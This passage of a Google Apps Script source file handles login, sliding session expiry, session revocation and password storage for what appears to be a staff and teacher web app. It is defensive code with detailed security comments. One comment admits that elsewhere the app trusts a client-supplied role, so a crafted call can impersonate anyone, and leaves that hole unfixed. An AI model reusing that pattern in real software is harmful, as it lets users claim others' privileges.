// English-language Google account — and _sessionAgeMs_ reads only year-first. So EVERY row
// parsed as "unreadable", which counts as "current": the 30-day expiry and the login prune
// removed nothing from 2026-08-19 on (one account reached 11 live sessions), and 最終操作
// showed the OLDEST session, because every seenAt was 0 and the newest-wins compare never
// fired. Found 2026-09-11. The leading apostrophe is Sheets' own text marker — the locale can
// no longer reformat the cell, and reads return the bare "2026-09-11 10:42:07".
function _sessionStamp_(date) {
  return "'" + Utilities.formatDate(date || new Date(), "Asia/Tokyo", "yyyy-MM-dd HH:mm:ss");
}

// When a session was last seen: LastSeen, else Created. ⚠️ A blank LastSeen is a session from
// before that column was written; judged by LastSeen alone it never expired.
function _sessionSeenOf_(row) {
  const ls = String((row || [])[5] == null ? "" : row[5]).trim();
  return ls !== "" ? ls : String((row || [])[4] == null ? "" : row[4]).trim();
}

// At most this many live sessions per ACCOUNT (_sessionAccountKey_); a new login retires the
// oldest. Every login used to add a working credential that nothing ever took away.
const SESSION_MAX_PER_ACCOUNT = 3;

// ⚠️ ONE PASS, and it REWRITES rather than deleting row by row. It normalises every Date cell
// to a stamp, drops expired sessions, and keeps each account's newest SESSION_MAX_PER_ACCOUNT.
// The first run after the date fix meets months of backlog at once, and one deleteRow is
// ~100–300ms — hundreds of them would be a login that hangs, or a trigger that times out. A
// read and at most two writes cost the same for 10 rows or 1,000.
// ⚠️ CALLERS HOLD THE SCRIPT LOCK (_withSessionLock_). A rewrite racing another writer is the
// row-shift bug this whole section exists to end. Writes nothing when nothing changed.
function _compactSessions_(sh, now) {
  const last = sh.getLastRow();
  if (last < 2) return { kept: 0, dropped: 0, normalised: 0 };
  const rows = sh.getRange(2, 1, last - 1, 6).getValues();
  let normalised = 0, dropped = 0;
  const live = [];
  rows.forEach(function (r, i) {
    if (String(r[0] || "").trim() === "") { dropped++; return; }          // a blank row
    const t = [4, 5].map(function (c) {
      // toString tag, not instanceof: true for a Date from ANY realm (tests/session.test.js §8).
      if (Object.prototype.toString.call(r[c]) === '[object Date]') { normalised++; return _sessionStamp_(r[c]).slice(1); }
      return String(r[c] == null ? "" : r[c]).trim();
    });
    const seen = t[1] !== "" ? t[1] : t[0];
    const age = _sessionAgeMs_(seen, now);
    if (age >= 0 && age > SESSION_MAX_AGE_MS) { dropped++; return; }        // expired
    live.push({ i: i, r: r, created: t[0], seen: t[1], rank: age >= 0 ? now - age : 0,
                key: _sessionAccountKey_(r[1], r[2]) });
  });
  // Newest first within each account; everything past the cap goes.
  const byKey = {};
  live.forEach(function (x) { (byKey[x.key] = byKey[x.key] || []).push(x); });
  const keep = {};
  Object.keys(byKey).forEach(function (k) {
    byKey[k].sort(function (a, b) { return b.rank - a.rank; })
            .forEach(function (x, n) { if (n < SESSION_MAX_PER_ACCOUNT) keep[x.i] = true; else dropped++; });
  });
  if (!normalised && !dropped) return { kept: live.length, dropped: 0, normalised: 0 };
  // Original order kept (it is creation order). A–D through _cellSafeRow_ — a name starting
  // with = would otherwise become a formula on the rewrite; E/F re-marked as text.
  const out = live.filter(function (x) { return keep[x.i]; }).map(function (x) {
    return _cellSafeRow_([x.r[0], x.r[1], x.r[2], x.r[3]])
      .concat([x.created ? "'" + x.created : "", x.seen ? "'" + x.seen : ""]);
  });
  if (out.length) sh.getRange(2, 1, out.length, 6).setValues(out);
  // Clear, not deleteRows: a sheet cannot lose ALL its non-frozen rows, and appendRow reuses
  // the freed tail anyway.
  if (rows.length > out.length) sh.getRange(2 + out.length, 1, rows.length - out.length, 6).clearContent();
  _forgetTab_(SESSION_SHEET);
  return { kept: out.length, dropped: dropped, normalised: normalised };
}

// ⚠️ EVERY change to the Sessions sheet goes through the script lock. Logins, logouts, revokes
// and expiry each delete rows, and a delete shifts every row below it — so a write aimed at a
// row NUMBER from an earlier read landed on someone else's session: 最終操作 moved between
// people, and a revoke could remove the wrong row and leave the revoked person signed in.
// Inside the lock a fresh read is the truth. waitLock(ms) queues; tryLock callers skip instead.
function _withSessionLock_(ms, fn, skipIfBusy) {
  const lock = LockService.getScriptLock();
  if (skipIfBusy) { if (!lock.tryLock(ms)) return null; }
  else lock.waitLock(ms);
  try { return fn(); } finally { lock.releaseLock(); }
}

// The row holding this token NOW — found at write time, never remembered from a read.
function _sessionRowOf_(sh, token) {
  const last = sh.getLastRow();
  if (last < 2 || !token) return 0;
  const hit = sh.getRange(2, 1, last - 1, 1).createTextFinder(String(token)).matchEntireCell(true).findNext();
  return hit ? hit.getRow() : 0;
}

function _deleteSessionByToken_(token) {
  return _withSessionLock_(10000, function () {
    const sh = _getSessionSheet_();
    const r = _sessionRowOf_(sh, token);
    if (r) { sh.deleteRow(r); _forgetTab_(SESSION_SHEET); }
    return r;
  });
}

// ⚠️ ADVISORY, so it never waits: a busy lock skips this touch rather than queueing every
// request behind a write. It happens at most once per SESSION_TOUCH_WINDOW per token anyway.
function _touchSessionByToken_(token) {
  return _withSessionLock_(2000, function () {
    const sh = _getSessionSheet_();
    const r = _sessionRowOf_(sh, token);
    if (r) sh.getRange(r, 6).setValue(_sessionStamp_(new Date()));
    return r;
  }, true);
}

// The unattended pass (triggerScheduledBackup): every row normalised and capped within hours
// of a deploy, even for people who never log in again.
function _compactSessionsLocked_() {
  return _withSessionLock_(30000, function () { return _compactSessions_(_getSessionSheet_(), Date.now()); });
}

function _issueSessionToken_(user) {
  try {
    const sh = _getSessionSheet_();
    const token = Utilities.getUuid() + Utilities.getUuid().replace(/-/g, '');
    const stamp = _sessionStamp_(new Date());
    // Appended FIRST, so the cap counts this login among the account's newest — it is never the
    // one retired. Under the lock; see _withSessionLock_.
    _withSessionLock_(10000, function () {
      sh.appendRow(_cellSafeRow_([token, user.role, user.id, user.name]).concat([stamp, stamp]));
      _compactSessions_(sh, Date.now());
    });
    // The per-execution read memo would otherwise hand back a snapshot taken
    // before this row existed.
    _forgetTab_(SESSION_SHEET);
    return token;
  } catch (e) {
    return ""; // if session storage fails, login still works (just no persistence)
  }
}

// Login: validate PIN, return user + a session token for persistence.
// Brute-force hardening for the PIN login.
//
// A web app receives no caller IP, so per-attacker limits are impossible — the
// only lever is making every failure cost time. Deliberately a DELAY and never a
// lockout: access is anonymous, so anyone could trip a lockout and deny every
// member of staff. The escalation is capped for the same reason.
//
// Failures go to Cloud Logging, NOT to Activity_Log — that sheet grows unbounded
// and appendRow slows as it does, so logging an attack there would degrade the
// whole app for everyone.
const LOGIN_FAIL_DELAY_MS    = 1500;   // every failed attempt pays this
const LOGIN_FAIL_WINDOW      = 300;    // 5 min counter window
const LOGIN_FAIL_ESCALATE_AT = 8;      // failures in the window before escalating
const LOGIN_FAIL_MAX_DELAY_MS = 8000;  // cap, so the delay can't become the DoS

function _noteLoginFailure_() {
  try {
    const cache = CacheService.getScriptCache();
    const n = (parseInt(cache.get('loginFails') || '0', 10) || 0) + 1;
    cache.put('loginFails', String(n), LOGIN_FAIL_WINDOW);
    return n;
  } catch (e) { return 1; }
}

// Shared failure path: one message for every reason, so the response cannot be
// used to discover which emails exist.
function _rejectLogin_(reason) {
  const n = _noteLoginFailure_();
  let wait = LOGIN_FAIL_DELAY_MS;
  if (n > LOGIN_FAIL_ESCALATE_AT) {
    wait = Math.min(LOGIN_FAIL_DELAY_MS * (1 + (n - LOGIN_FAIL_ESCALATE_AT)), LOGIN_FAIL_MAX_DELAY_MS);
  }
  try { Utilities.sleep(wait); } catch (e) {}
  try { console.warn('Login failure [' + reason + '] (' + n + ' in the last ' + (LOGIN_FAIL_WINDOW / 60) + ' min), delayed ' + wait + 'ms'); } catch (e) {}
  throw new Error("メールアドレスまたはパスワードが正しくありません。");
}

// Email + password. The master account signs in as MASTER with the SYSTEM_PIN
// script property — it lives in no sheet, so it stays the break-glass.
function loginUser(email, password) {
  const id = String(email == null ? "" : email).trim();
  const pw = String(password == null ? "" : password);

  let user = null, mustSetPassword = false;

  if (id.toUpperCase() === "MASTER") {
    const sysPin = _systemPin_();
    // Fail closed. Distinct message on purpose: this one is not a wrong
    // password, it is a project with no master configured, and saying so is the
    // only way anyone notices. It leaks nothing — an attacker learns the account
    // is unusable, which is exactly the state we want to be in.
    if (sysPin === "") {
      try { console.warn("Master login attempted but SYSTEM_PIN is not set — rejected."); } catch (e) {}
      throw new Error("マスターアカウントは未設定です。スクリプトプロパティ SYSTEM_PIN を設定してください。");
    }
    if (pw !== sysPin) _rejectLogin_("master password");
    user = { role: "master", id: "MASTER", name: "システム", email: "", notifications: false, permissions: "ALL" };
  } else {
    const acct = _findAccountByEmail_(id);
    if (!acct) _rejectLogin_("no such email");
    const v = _verifyAccountPassword_(acct.row, pw);
    if (!v.ok) _rejectLogin_("bad password");
    user = _userFromRow_(acct.row, acct.role);
    mustSetPassword = v.mustSetPassword;
  }

  // Credentials have just been verified, so this is the caller. _bootPayload_
  // below calls getDashboardData and _hasPerm_, which read the parked user — a
  // fresh login would otherwise build its payload with no permissions at all.
  _authUser = user;

  const token = _issueSessionToken_(user);
  _logActivity_({ name: user.name, id: user.id, role: user.role }, "ログイン", "", "");
  // `boot` rides along so a fresh login gets the same single round trip as the
  // resume path. Skipped when a password change is being forced — the app is not
  // reachable until that is done, so fetching its data would be wasted work.
  return {
    user: user,
    token: token,
    mustSetPassword: mustSetPassword,
    boot: mustSetPassword ? null : _bootPayload_(user)
  };
}

// LastSeen is written by code and read only by humans looking at the sheet, so
// it does not need to be exact — but a setValue() is a synchronous spreadsheet
// write, and it was happening on EVERY page load for every user. Throttled
// through the cache: one write per token per window, and an evicted cache entry
// just means one extra write, never a wrong result.
const SESSION_TOUCH_WINDOW = 21600;   // 6h

function _shouldTouchSession_(token) {
  try {
    const cache = CacheService.getScriptCache();
    const k = 'seen_' + String(token).substring(0, 40);
    if (cache.get(k)) return false;
    cache.put(k, '1', SESSION_TOUCH_WINDOW);
    return true;
  } catch (e) {
    return true;   // no cache — fall back to the old always-write behaviour
  }
}

// ---- SESSION EXPIRY --------------------------------------------------------
//
// Tokens used to live forever: resumeSession accepted any row in Sessions, no
// matter how old, and nothing ever read the LastSeen column it had been writing
// for months. A token sitting in localStorage on a shared or lost machine was a
// permanent credential.
//
// Sliding, not absolute — measured against LastSeen, which every resume
// refreshes. Someone who uses the app weekly is never signed out; a token nobody
// has touched in a month stops working.
//
// ⚠️ 30 days must stay FAR above SESSION_TOUCH_WINDOW (6h). That window throttles
// how often LastSeen is rewritten, so it is also the granularity of the sliding
// renewal — the true expiry is anywhere in [MAX_AGE, MAX_AGE + 6h]. Bring the two
// close together and active users start being logged out mid-session.
const SESSION_MAX_AGE_DAYS = 30;
const SESSION_MAX_AGE_MS = SESSION_MAX_AGE_DAYS * 24 * 60 * 60 * 1000;

// Sessions is read through _readTabs_, which renders with FORMATTED_VALUE /
// FORMATTED_STRING — so LastSeen arrives as whatever the spreadsheet's locale
// prints, not as a Date. Parsed by hand rather than with `new Date(s)` because
// that is locale-dependent, and this is the §9.2 bug class: the value looks
// perfectly fine and compares wrong.
//
// ⚠️ FAILS OPEN on anything it cannot read, deliberately. Failing closed on a
// parse it did not anticipate would sign out every member of staff at once, with
// nothing on screen saying why — a far worse outcome than one stale token living
// longer than it should. Unreadable values go to Cloud Logging instead.
function _sessionAgeMs_(lastSeen, now) {
  const s = String(lastSeen == null ? "" : lastSeen).trim();
  if (s === "") return -1;                     // blank — never touched; see below
  // yyyy/MM/dd HH:mm:ss and yyyy-MM-dd HH:mm:ss, with the time optional.
  const m = s.match(/^(\d{4})[\/\-](\d{1,2})[\/\-](\d{1,2})(?:[ T](\d{1,2}):(\d{2})(?::(\d{2}))?)?/);
  if (!m) {
    try { console.warn("Session LastSeen not understood, treating as current: " + s); } catch (e) {}
    return -1;
  }
  const t = new Date(+m[1], +m[2] - 1, +m[3], +(m[4] || 0), +(m[5] || 0), +(m[6] || 0)).getTime();
  if (isNaN(t)) return -1;
  return now - t;
}

// -1 (unparseable or blank) is NOT expired. A blank LastSeen means the row
// predates the column being written, and those are the oldest sessions in the
// sheet — but signing out an unknown number of people is a staff-facing event,
// and it should be a decision rather than a side effect of this change. The
// touch on the next resume gives every such row a real timestamp, so they start
// ageing from first sight and converge on the policy within one use.
function _sessionExpired_(lastSeen, now) {
  const age = _sessionAgeMs_(lastSeen, now);
  return age >= 0 && age > SESSION_MAX_AGE_MS;
}

// Resume a session from a stored token. Re-reads the user's CURRENT data so
// permission changes or deletions take effect. Returns the user or throws.
function resumeSession(token) {
  return _sessionLookup_(token, true);
}

// The ONE decision about whether a token is a live session. ⚠️ `touch` is the
// only difference between its two callers. checkSession must NOT write LastSeen:
// an open tab would refresh it forever, defeating the 30-day idle expiry and
// turning 最終操作 into "has a tab open". Everything else — expiry, a deleted
// user, a cleared master PIN — is shared, so the idle check and the real guard
// cannot disagree about who is signed in.
function _sessionLookup_(token, touch) {
  if (!token) throw _sessionDeadError_("セッションがありません。再度ログインしてください。");
  _getSessionSheet_();   // ensure it exists before the batched read looks for it
  // Read via _readTabs_ so this shares one batchGet with Staff_Master and the
  // rest of the boot payload. Values come back as strings, which is all the
  // token/role/id columns ever were — nothing here reads a Date.
  const data = _readTabs_([SESSION_SHEET])[SESSION_SHEET] || [];
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][0]) === String(token)) {
      // ⚠️ BEFORE resolving the user. An expired token must not reach
      // _resolveUserById_, and must not park _authUser — the whole guard layer
      // reads that, so an expired session that got parked would be a live one.
      if (_sessionExpired_(_sessionSeenOf_(data[i]), Date.now())) {
        try { _deleteSessionByToken_(token); } catch (e) {}
        try { console.warn("Session expired after " + SESSION_MAX_AGE_DAYS + " days idle: " + String(data[i][2] || "")); } catch (e) {}
        // Same message as an unknown token, on purpose: it tells an attacker holding
        // a stale token nothing about whether it was ever valid. The client signs
        // out on it (_isSessionDead in Index.html) — until 2026-09-11 this comment
        // claimed it already did, and nothing did: the page stayed up behind alerts.
        throw _sessionDeadError_("セッションが無効です。再度ログインしてください。");
      }
      const role = String(data[i][1]);
      const id = String(data[i][2]);
      const user = _resolveUserById_(role, id);
      if (!user) {
        // user was deleted — revoke this session (by token: the row number is stale)
        try { _deleteSessionByToken_(token); } catch (e) {}
        throw _sessionDeadError_("ユーザーが見つかりません。再度ログインしてください。");
      }
      if (touch && _shouldTouchSession_(token)) {
        try { _touchSessionByToken_(token); } catch (e) {}
      }
      // A token has just been PROVEN, so this is the caller for the rest of the
      // execution. Parking it here rather than only in apiCall covers the
      // functions that resolve their own token — getBootBundle,
      // changeOwnPassword, completePasswordSetup, adminResetPassword — whose
      // bodies then go on to use the guard helpers.
      _authUser = user;
      return user;
    }
  }
  throw _sessionDeadError_("セッションが無効です。再度ログインしてください。");
}

// Is this token still a live session? For the browser's idle check
// (Index.html _sessionCheck) — the only way a revoked screen can lock without
// anyone clicking, since Apps Script has no push.
// ⚠️ OFF the apiCall registry, like logoutSession: apiCall resumes the session
// before it dispatches, and resuming TOUCHES LastSeen. This must not.
// ⚠️ FAILS OPEN. Only a genuine session-death answer says dead; a Sheets error
// says alive, or one hiccup would sign out every open tab at once. The real
// guard still judges the next actual call either way.
// Answers nothing but the boolean. It is no new oracle: a token is two UUIDs, and
// apiCall already answers "is this token valid" in exactly the same way.
function checkSession(token) {
  try { _sessionLookup_(String(token || ""), false); return { alive: true }; }
  catch (e) { return { alive: !(e && e.sessionDead) }; }
  finally { _authUser = null; }
}

// ---- ACCESS REVOCATION -----------------------------------------------------
//
// Deleting a user already cuts them off, but only on their NEXT request, and it
// is destructive — no use for someone on leave, or an account you suspect is
// being misused and want to preserve for the audit trail. These two are the
// non-destructive version: see who is signed in, and cut one off now.

function getActiveSessions(role, perms) {
  if (!_isMasterRole_(role) && !_hasPerm_(role, perms, "manage_users")) {
    throw new Error("権限がありません");
  }
  const data = _readTabs_([SESSION_SHEET])[SESSION_SHEET] || [];
  const now = Date.now();
  let out = [];
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][0] || "").trim() === "") continue;
    // ⚠️ An expired session is refused on resume, but it stays in the sheet until
    // that token is resumed or somebody logs in fresh — rare, because sessions
    // persist. Listed, it showed as ログイン中 with a 最終操作 months old, and it was
    // the row the client kept. The same decision resumeSession makes, so the badge
    // and "can actually act" cannot disagree. ⚠️ FILTERED, never deleted: this is
    // a read path; expiry and _compactSessions_ (login, scheduled pass) are the writers.
    const seen = _sessionSeenOf_(data[i]);
    if (_sessionExpired_(seen, now)) continue;
    const age = _sessionAgeMs_(seen, now);
    out.push({
      // ⚠️ The token itself is NEVER returned. It is a bearer credential — putting
      // it on an admin screen would be the plaintext-PIN mistake again, where the
      // user list printed every colleague's working credential.
      role: String(data[i][1] || ""), id: String(data[i][2] || ""),
      name: String(data[i][3] || ""), started: String(data[i][4] || ""),
      lastSeen: seen,
      // A number, so ordering never depends on the sheet's display format. 0 for
      // a blank or unreadable cell.
      seenAt: age >= 0 ? now - age : 0
    });
  }
  out.sort(function (a, b) { return b.seenAt - a.seenAt; });
  return out;
}

// Which ACCOUNT a session belongs to. ⚠️ Not the literal (role, id): a session keeps
// the role it was issued with, which goes stale when someone is moved between staff
// roles (see _resolveUserById_, the authority) — an exact match would miss a 営業 →
// 事務 move and leave them signed in. And not the ID alone: Staff_Master and
// Teacher_Master are different sheets with no shared ID space, so revoking 営業 5
// signed out 教務 5 too. The identity is the sheet the session resolves against —
// the choice _resolveUserById_ makes. Index.html's _usersSessionKey mirrors it, and
// tests/session.test.js binds the two.
function _sessionAccountKey_(role, id) {
  return (String(role || "") === "teacher" ? "teacher" : "staff") + "|" + String(id || "").trim();
}

// Kill every live session for one user, immediately. They are signed out on their
// next action — or within about two minutes on an idle screen, via checkSession.
// Nothing about their account changes, so it is safe to use on a suspicion and
// undo by simply telling them to sign in again.
// ⚠️ userRole is APPENDED, so a page loaded before it existed sends nothing — and
// is refused, never answered with an ID-only match, which is the bug it fixes.
function revokeUserSessions(role, perms, userId, actorName, actorId, userRole) {
  if (!_isMasterRole_(role) && !_hasPerm_(role, perms, "manage_users")) {
    throw new Error("権限がありません");
  }
  const uid = String(userId || "").trim();
  if (uid === "") throw new Error("対象のユーザーが指定されていません。");
  // ⚠️ MASTER cannot be revoked from here. The master account is how you recover
  // from a mistake on this very screen, and an admin holding manage_users must not
  // be able to lock the owner out of their own app.
  if (uid === "MASTER") throw new Error("マスターアカウントは無効化できません。");
  if (String(userRole || "").trim() === "") throw new Error("画面が古くなっています。再読み込みしてからもう一度お試しください。");
  const want = _sessionAccountKey_(userRole, uid);

  let killed = 0, who = "";
  // ⚠️ Under the lock, with a FRESH read inside it: a login's compaction or another delete
  // between read and delete would shift the rows, and a revoke would remove the wrong
  // session — leaving the revoked person signed in.
  _withSessionLock_(10000, function () {
    const sh = _getSessionSheet_();
    const data = sh.getDataRange().getDisplayValues();
    // Bottom-up: deleting row N shifts every later row up, and a top-down loop
    // would skip the row that moved into the gap — §8.3's sheet-row shift class.
    for (let i = data.length - 1; i >= 1; i--) {
      if (_sessionAccountKey_(data[i][1], data[i][2]) !== want) continue;
      who = who || String(data[i][3] || "");
      sh.deleteRow(i + 1);
      killed++;
    }
    if (killed) _forgetTab_(SESSION_SHEET);
  });
  try { _logActivity_({ role: role, name: actorName || "", id: actorId || "" },
                     "アクセスを無効化", uid + (who ? " (" + who + ")" : "") + " [" + String(userRole) + "]",
                     killed + "件のセッションを削除"); } catch (e) {}
  return { revoked: killed };
}

// Explicit logout: revoke the token server-side.
function logoutSession(token) {
  if (!token) return "OK";
  try {
    // Under the lock, by token — the row it read is the row it deletes.
    const actor = _withSessionLock_(10000, function () {
      const sh = _getSessionSheet_();
      const r = _sessionRowOf_(sh, token);
      if (!r) return null;
      const row = sh.getRange(r, 1, 1, 4).getValues()[0];
      sh.deleteRow(r);
      _forgetTab_(SESSION_SHEET);
      return { name: row[3], id: row[2], role: row[1] };
    });
    if (actor) _logActivity_(actor, "ログアウト", "", "");
  } catch (e) {}
  return "OK";
}

// ---- アカウント設定: the caller's OWN sessions -----------------------------------------
//
// ⚠️ The browser names a session by an opaque HANDLE, never by its token. The token is a bearer
// credential; the handle is the first 16 hex characters of its SHA-256, which signs nobody in if
// copied and cannot be turned back into a token. The server recomputes it to find the row.
// ⚠️ All three are scoped to the caller's ACCOUNT (_sessionAccountKey_), the same key revoke and the
// ×3 cap use, so a teacher and a staff member who share ID 5 never see or end each other's sessions.
function _sessionHandle_(token) {
  const bytes = Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, String(token || ""), Utilities.Charset.UTF_8);
  let hex = "";
  for (let i = 0; i < 8; i++) hex += ("0" + ((bytes[i] + 256) % 256).toString(16)).slice(-2);
  return hex;
}

// One round trip when アカウント設定 opens: when the password was last changed, and where this
// account is signed in. ⚠️ Nothing from the credential columns except the PwUpdatedAt stamp.
function getMyAccount() {
  const me = _requireSession_("getMyAccount");
  if (!me) throw _sessionDeadError_("セッションがありません。再度ログインしてください。");
  let pwUpdatedAt = null;
  if (!_isMasterRole_(me.role)) {
    const acct = _findAccountById_(me.role, me.id);
    if (acct) pwUpdatedAt = String(acct.row[9] || "").trim() || null;
  }
  const want = _sessionAccountKey_(me.role, me.id);
  const data = _readTabs_([SESSION_SHEET])[SESSION_SHEET] || [];
  const now = Date.now();
  let sessions = [];
  for (let i = 1; i < data.length; i++) {
    const tok = String(data[i][0] || "");
    if (tok === "" || _sessionAccountKey_(data[i][1], data[i][2]) !== want) continue;
    const seen = _sessionSeenOf_(data[i]);
    // The decision resume makes: an expired row cannot act, so it is not "signed in".
    if (_sessionExpired_(seen, now)) continue;
    const age = _sessionAgeMs_(seen, now);
    sessions.push({
      sid: _sessionHandle_(tok),
      started: String(data[i][4] || ""),
      lastSeen: seen,
      seenAt: age >= 0 ? now - age : 0,
      current: _authToken !== "" && tok === _authToken
    });
  }
  sessions.sort(function (a, b) { return (b.current - a.current) || (b.seenAt - a.seenAt); });
  return { pwUpdatedAt: pwUpdatedAt, sessions: sessions };
}

// End ONE of the caller's other sessions. ⚠️ Refuses the current one: that is what ログアウト is
// for, and ending it from here would leave this screen standing on a dead token.
function signOutMySession(sid) {
  const me = _requireSession_("signOutMySession");
  if (!me) throw _sessionDeadError_("セッションがありません。再度ログインしてください。");
  const want = _sessionAccountKey_(me.role, me.id);
  const handle = String(sid || "").trim();
  if (handle === "") throw new Error("対象の端末が指定されていません。");
  // ⚠️ Under the lock, with a FRESH read inside it: a login's compaction between read and delete
  // would shift the rows and end the wrong session.
  const done = _withSessionLock_(10000, function () {
    const sh = _getSessionSheet_();
    const data = sh.getDataRange().getDisplayValues();
    for (let i = data.length - 1; i >= 1; i--) {
      const tok = String(data[i][0] || "");
      if (tok === "" || _sessionAccountKey_(data[i][1], data[i][2]) !== want) continue;
      if (_sessionHandle_(tok) !== handle) continue;
      if (_authToken !== "" && tok === _authToken) return "current";
      sh.deleteRow(i + 1);
      _forgetTab_(SESSION_SHEET);
      return "deleted";
    }
    return "missing";
  });
  if (done === "current") throw new Error("この端末は「ログアウト」から終了してください。");
  if (done === "missing") throw new Error("その端末はすでにログアウトしています。画面を更新してください。");
  try { _logActivity_({ name: me.name, id: me.id, role: me.role }, "端末からログアウト", "", "1件"); } catch (e) {}
  return { signedOut: 1 };
}

// End every OTHER session on this account. This is what makes a password change stick: changing
// a password does not end the sessions already issued.
function signOutMyOtherSessions() {
  const me = _requireSession_("signOutMyOtherSessions");
  if (!me) throw _sessionDeadError_("セッションがありません。再度ログインしてください。");
  // ⚠️ Without the proven token every row would count as "other", including this one.
  if (_authToken === "") throw new Error("この端末を確認できませんでした。画面を更新してから、もう一度お試しください。");
  const want = _sessionAccountKey_(me.role, me.id);
  const killed = _withSessionLock_(10000, function () {
    const sh = _getSessionSheet_();
    const data = sh.getDataRange().getDisplayValues();
    let n = 0;
    // Bottom-up: deleting row N shifts every later row up (§8.3).
    for (let i = data.length - 1; i >= 1; i--) {
      const tok = String(data[i][0] || "");
      if (tok === "" || tok === _authToken || _sessionAccountKey_(data[i][1], data[i][2]) !== want) continue;
      sh.deleteRow(i + 1);
      n++;
    }
    if (n) _forgetTab_(SESSION_SHEET);
    return n;
  });
  try { _logActivity_({ name: me.name, id: me.id, role: me.role }, "他の端末からログアウト", "", killed + "件"); } catch (e) {}
  return { signedOut: killed };
}


// ==========================================
// PASSWORDS — every function here identifies the caller from the SESSION TOKEN
// ==========================================
// The rest of the app takes the caller's role from the client, which means a
// crafted google.script.run call can claim to be anyone. That is pre-existing and
// too large to fix here, but it MUST NOT extend to credentials: resolving the
// actor from a client argument would turn changeOwnPassword into "change anyone's
// password". So these resolve through resumeSession, which reads the Sessions
// sheet and re-reads the user's current row.

function _findAccountById_(role, id) {
  const sheetName = role === "teacher" ? "Teacher_Master" : "Staff_Master";
  const rows = _readTabs_([sheetName])[sheetName] || [];
  const want = String(id || "").trim();
  for (let i = 1; i < rows.length; i++) {
    if (String(rows[i][0]).trim() === want) {
      return { sheetName: sheetName, role: role, rowIndex: i + 1, row: rows[i] };
    }
  }
  return null;
}

function _passwordProblem_(pw) {
  const v = String(pw == null ? "" : pw);
  if (v.length < PW_MIN_LENGTH) {
    return "パスワードは" + PW_MIN_LENGTH + "文字以上にしてください。";
  }
  if (/^\s|\s$/.test(v)) return "パスワードの先頭・末尾に空白は使えません。";
  return "";
}

// Write a new password onto an account row. Also clears the legacy PIN, so
// plaintext credentials disappear per user as people migrate rather than waiting
// for one bulk cleanup at the end.
// The password columns are written as a 5-wide range starting at column 7, so
// the grid must be at least ACCOUNT_COLS wide or getRange exceeds it and throws.
//
// Widening on demand rather than relying on migrateAddPasswordColumns having run
// first, because the deploy-order failure here is severe: on a pre-migration
// sheet a user logs in with their old PIN (which still works — the hash column
// reads as empty), is pushed to the mandatory password-set panel, and is then
// unable to save one. Locked out, with no way forward. Same lesson as
// _ensureBuildingColumns_.
function _ensureAccountColumns_(sheet) {
  try {
    const have = sheet.getMaxColumns();
    if (have < ACCOUNT_COLS) sheet.insertColumnsAfter(have, ACCOUNT_COLS - have);
  } catch (e) { /* best-effort; a genuinely un-widenable sheet surfaces at the write */ }
}

function _writeAccountPassword_(acct, newPassword, mustChange) {
  const sh = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(acct.sheetName);
  _ensureAccountColumns_(sh);
  const salt = _newSalt_();
  const hash = _hashPassword_(newPassword, salt, PW_ITERATIONS);
  const stamp = Utilities.formatDate(new Date(), Session.getScriptTimeZone() || "Asia/Tokyo", "yyyy-MM-dd HH:mm:ss");

  sh.getRange(acct.rowIndex, 7, 1, 5).setNumberFormat("@");
  sh.getRange(acct.rowIndex, 7, 1, 5)
    .setValues([[hash, salt, String(PW_ITERATIONS), stamp, mustChange ? "Y" : ""]]);
  sh.getRange(acct.rowIndex, 3).setValue("");   // legacy PIN, no longer needed
  _forgetTab_(acct.sheetName);
  SpreadsheetApp.flush();
}

// Normal change: requires the current password.
function changeOwnPassword(token, currentPassword, newPassword) {
  const user = resumeSession(token);   // throws on an invalid/expired token
  if (_isMasterRole_(user.role)) {
    throw new Error("マスターアカウントのパスワードはスクリプトプロパティ（SYSTEM_PIN）で変更してください。");
  }
  const acct = _findAccountById_(user.role, user.id);
  if (!acct) throw new Error("アカウントが見つかりません。");

  if (!_verifyAccountPassword_(acct.row, String(currentPassword || "")).ok) {
    throw new Error("現在のパスワードが正しくありません。");
  }
  const problem = _passwordProblem_(newPassword);
  if (problem) throw new Error(problem);
  if (String(newPassword) === String(currentPassword)) {
    throw new Error("新しいパスワードが現在のものと同じです。");
  }

  _writeAccountPassword_(acct, String(newPassword), false);
  _logActivity_({ name: user.name, id: user.id, role: user.role }, "パスワード変更", "", "");
  return "パスワードを変更しました。";
}

// First-time set, and the forced change after an admin reset. No current password
// is required — holding a valid session token already proves the user
// authenticated, whether by their old PIN or by the temporary password.
// Deliberately refuses when the account is NOT in a must-set state, so it can
// never be used to bypass changeOwnPassword's current-password check.
function completePasswordSetup(token, newPassword) {
  const user = resumeSession(token);
  if (_isMasterRole_(user.role)) throw new Error("マスターアカウントでは使用できません。");
  const acct = _findAccountById_(user.role, user.id);
  if (!acct) throw new Error("アカウントが見つかりません。");

  const hasHash = String(acct.row[6] || "").trim() !== "";
  const mustChange = String(acct.row[10] || "").trim() === "Y";
  if (hasHash && !mustChange) {
    throw new Error("パスワードは設定済みです。変更は「アカウント設定」から行ってください。");
  }

  const problem = _passwordProblem_(newPassword);
  if (problem) throw new Error(problem);

  _writeAccountPassword_(acct, String(newPassword), false);
  _logActivity_({ name: user.name, id: user.id, role: user.role }, "パスワード初期設定", "", "");
  return "パスワードを設定しました。";
}

// Admin-issued temporary password. Shown to the admin ONCE — it is hashed on the
// way in and cannot be read back afterwards.
const TEMP_PW_ALPHABET = "abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789"; // no l/1/I, 0/O
// ⚠️ Utilities.getUuid(), NOT Math.random(). This value is a credential, and
// _newSalt_ three lines up has always used getUuid — this was the odd one out.
// Not demonstrably exploitable (each Apps Script execution is a fresh V8 isolate,
// so there is no output sequence to recover the PRNG state from), but there is no
// reason for a password to come from a non-CSPRNG.
//
// Rejection sampling, not a modulo: the alphabet is 56 characters and 256 % 56
// is 32, so `byte % 56` would make the first 32 characters ~25% more likely than
// the rest. Bytes at or above 224 (the largest multiple of 56 under 256) are
// discarded instead, which costs a few extra bytes and biases nothing.
function _tempPassword_() {
  const n = TEMP_PW_ALPHABET.length;
  const limit = Math.floor(256 / n) * n;   // 224 for a 56-character alphabet
  let pool = "", s = "";
  while (s.length < 12) {
    // Top up rather than assuming one UUID is enough — rejected bytes mean the
    // pool can run dry, and an empty pool here would loop forever.
    if (pool.length < 2) pool += Utilities.getUuid().replace(/-/g, "");
    const b = parseInt(pool.substring(0, 2), 16);
    pool = pool.substring(2);
